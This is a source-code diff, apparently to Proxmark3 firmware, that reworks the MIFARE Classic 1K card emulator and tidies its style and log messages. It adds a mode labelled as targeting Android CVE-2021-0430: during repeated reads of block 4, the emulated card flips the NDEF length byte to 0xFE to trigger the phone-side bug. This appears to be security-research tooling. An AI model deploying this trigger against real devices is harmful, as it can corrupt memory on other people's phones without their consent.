@@ -85,7 +85,6 @@ static bool IsTrailerAccessAllowed(uint8_t blockNo, uint8_t keytype, uint8_t act
     }
 }
 
-
 static bool IsDataAccessAllowed(uint8_t blockNo, uint8_t keytype, uint8_t action) {
 
     uint8_t sector_trailer[16];
@@ -243,7 +242,7 @@ static bool MifareSimInit(uint16_t flags, uint8_t *datain, uint16_t atqa, uint8_
                 rSAK[0] = block0[7];
                 memcpy(rATQA, &block0[8], sizeof(rATQA));
             } else {
-                Dbprintf("[-] ERROR: Invalid dump. UID/SAK/ATQA not found");
+                Dbprintf("ERROR: " _RED_("Invalid dump. UID/SAK/ATQA not found"));
                 return false;
             }
         }
@@ -342,7 +341,7 @@ static bool MifareSimInit(uint16_t flags, uint8_t *datain, uint16_t atqa, uint8_
         // Correct uid size bits in ATQA
         rATQA[0] = (rATQA[0] & 0x3f) | 0x80; // triple size uid
     } else {
-        Dbprintf("[-] ERROR: UID size not defined");
+        Dbprintf("ERROR: " _RED_("UID size not defined"));
         return false;
     }
     if (flags & FLAG_FORCED_ATQA) {
@@ -450,19 +449,10 @@ static bool MifareSimInit(uint16_t flags, uint8_t *datain, uint16_t atqa, uint8_
 void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t atqa, uint8_t sak) {
     tag_response_info_t *responses;
     uint8_t cardSTATE = MFEMUL_NOFIELD;
-    uint8_t uid_len = 0; // 4,7, 10
-    uint32_t cuid = 0;
-
-    int vHf = 0; // in mV
-
-    uint32_t selTimer = 0;
-    uint32_t authTimer = 0;
-
+    uint8_t uid_len = 0; // 4, 7, 10
+    uint32_t cuid = 0, selTimer = 0, authTimer = 0;
+    uint32_t nr, ar;
     uint8_t blockNo;
-
-    uint32_t nr;
-    uint32_t ar;
-
     bool encrypted_data;
 
     uint8_t cardWRBL = 0;
@@ -470,9 +460,9 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
     uint8_t cardAUTHKEY = AUTHKEYNONE;  // no authentication
     uint32_t cardRr = 0;
     uint32_t ans = 0;
-
     uint32_t cardINTREG = 0;
     uint8_t cardINTBLOCK = 0;
+
     struct Crypto1State mpcs = {0, 0};
     struct Crypto1State *pcs;
     pcs = &mpcs;
@@ -529,28 +519,44 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
     LED_D_ON();
     ResetSspClk();
 
+    uint8_t *p_em = BigBuf_get_EM_addr();
+    uint8_t cve_flipper = 0;
+
+    int counter = 0;
     bool finished = false;
     bool button_pushed = BUTTON_PRESS();
+    while (!button_pushed && !finished) {
 
-    while (!button_pushed && !finished && !data_available()) {
         WDT_HIT();
 
-        // find reader field
-        if (cardSTATE == MFEMUL_NOFIELD) {
-
-#if defined RDV4
-            vHf = (MAX_ADC_HF_VOLTAGE_RDV40 * SumAdc(ADC_CHAN_HF_RDV40, 32)) >> 15;
-#else
-            vHf = (MAX_ADC_HF_VOLTAGE * SumAdc(ADC_CHAN_HF, 32)) >> 15;
-#endif
-
-            if (vHf > MF_MINFIELDV) {
-                cardSTATE_TO_IDLE();
-                LED_A_ON();
+        if (counter == 3000) {
+            if (data_available()) {
+                Dbprintf("----------- " _GREEN_("BREAKING") " ----------");
+                break;
             }
-            button_pushed = BUTTON_PRESS();
-            continue;
+            counter = 0;
+        } else {
+            counter++;
         }
+
+        /*
+                // find reader field
+                if (cardSTATE == MFEMUL_NOFIELD) {
+
+        #if defined RDV4
+                    vHf = (MAX_ADC_HF_VOLTAGE_RDV40 * SumAdc(ADC_CHAN_HF_RDV40, 32)) >> 15;
+        #else
+                    vHf = (MAX_ADC_HF_VOLTAGE * SumAdc(ADC_CHAN_HF, 32)) >> 15;
+        #endif
+
+                    if (vHf > MF_MINFIELDV) {
+                        cardSTATE_TO_IDLE();
+                        LED_A_ON();
+                    }
+                    button_pushed = BUTTON_PRESS();
+                    continue;
+                }
+                */
 
         FpgaEnableTracing();
         //Now, get data
@@ -558,6 +564,10 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
 
         if (res == 2) { //Field is off!
             //FpgaDisableTracing();
+            if ((flags & FLAG_CVE21_0430) == FLAG_CVE21_0430) {
+                p_em[1] = 0x21;
+                cve_flipper = 0;
+            }
             LEDsoff();
             cardSTATE = MFEMUL_NOFIELD;
             if (DBGLEVEL >= DBG_EXTENDED)
@@ -591,6 +601,11 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
             LED_B_OFF();
             LED_C_OFF();
             cardSTATE = MFEMUL_SELECT;
+
+            if ((flags & FLAG_CVE21_0430) == FLAG_CVE21_0430) {
+                p_em[1] = 0x21;
+                cve_flipper = 0;
+            }
             continue;
         }
 
@@ -837,7 +852,8 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
                         EmSend4bit(mf_crypto1_encrypt4bit(pcs, CARD_NACK_NA));
                         FpgaDisableTracing();
 
-                        if (DBGLEVEL >= DBG_ERROR) Dbprintf("[MFEMUL_WORK] Reader tried to operate (0x%02x) on block (0x%02x) not authenticated for (0x%02x), nacking", receivedCmd_dec[0], receivedCmd_dec[1], cardAUTHSC);
+                        if (DBGLEVEL >= DBG_ERROR)
+                            Dbprintf("[MFEMUL_WORK] Reader tried to operate (0x%02x) on block (0x%02x) not authenticated for (0x%02x), nacking", receivedCmd_dec[0], receivedCmd_dec[1], cardAUTHSC);
                         break;
                     }
                 }
@@ -845,8 +861,39 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
                 // case MFEMUL_WORK => CMD READ block
                 if (receivedCmd_len == 4 && receivedCmd_dec[0] == ISO14443A_CMD_READBLOCK) {
                     blockNo = receivedCmd_dec[1];
-                    if (DBGLEVEL >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] Reader reading block %d (0x%02x)", blockNo, blockNo);
+                    if (DBGLEVEL >= DBG_EXTENDED)
+                        Dbprintf("[MFEMUL_WORK] Reader reading block %d (0x%02x)", blockNo, blockNo);
+
+                    // android CVE 2021_0430
+                    // Simulate a MFC 1K,  with a NDEF message.
+                    // these values uses the standard LIBNFC NDEF message
+                    //
+                    // In short,  first a value read of block 4,
+                    // update the length byte before second read of block 4.
+                    // on iphone etc there might even be 3 reads of block 4.
+                    // fiddling with when to flip the byte or not,  has different effects
+                    if ((flags & FLAG_CVE21_0430) == FLAG_CVE21_0430) {
+
+                        // first block
+                        if (blockNo == 4) {
+
+                            p_em += blockNo * 16;
+                            // TLV in NDEF, flip length between
+                            //  4 | 03 21 D1 02 1C 53 70 91 01 09 54 02 65 6E 4C 69
+                            // 0xFF means long length
+                            // 0xFE mean max short length
+
+                            // We could also have a go at message len byte at p_em[4]...
+                            if (p_em[1] == 0x21 && cve_flipper == 1) {
+                                p_em[1] = 0xFE;
+                            } else {
+                                cve_flipper++;
+                            }
+                        }
+                    }
+
                     emlGetMem(response, blockNo, 1);
+
                     if (DBGLEVEL >= DBG_EXTENDED)  {
                         Dbprintf("[MFEMUL_WORK - ISO14443A_CMD_READBLOCK] Data Block[%d]: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x", blockNo,
                                  response[0], response[1], response[2], response[3],  response[4],  response[5],  response[6],
@@ -871,20 +918,20 @@ void Mifare1ksim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint1
                     // Check if selected Block is a Sector Trailer
                     if (IsSectorTrailer(blockNo)) {
 
-                        if (!IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYA_READ)) {
+                        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYA_READ) == false) {
                             memset(response, 0x00, 6); // keyA can never be read
                             if (DBGLEVEL >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsSectorTrailer] keyA can never be read - block %d (0x%02x)", blockNo, blockNo);
                         }
-                        if (!IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYB_READ)) {
+                        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_KEYB_READ) == false) {
                             memset(response + 10, 0x00, 6); // keyB cannot be read
                             if (DBGLEVEL >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsSectorTrailer] keyB cannot be read - block %d (0x%02x)", blockNo, blockNo);
                         }
-                        if (!IsAccessAllowed(blockNo, cardAUTHKEY, AC_AC_READ)) {
+                        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_AC_READ) == false) {
                             memset(response + 6, 0x00, 4); // AC bits cannot be read
                             if (DBGLEVEL >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsAccessAllowed] AC bits cannot be read - block %d (0x%02x)", blockNo, blockNo);
                         }
                     } else {
-                        if (!IsAccessAllowed(blockNo, cardAUTHKEY, AC_DATA_READ)) {
+                        if (IsAccessAllowed(blockNo, cardAUTHKEY, AC_DATA_READ) == false) {
                             memset(response, 0x00, 16); // datablock cannot be read
                             if (DBGLEVEL >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK - IsAccessAllowed] Data block %d (0x%02x) cannot be read", blockNo, blockNo);
                         }
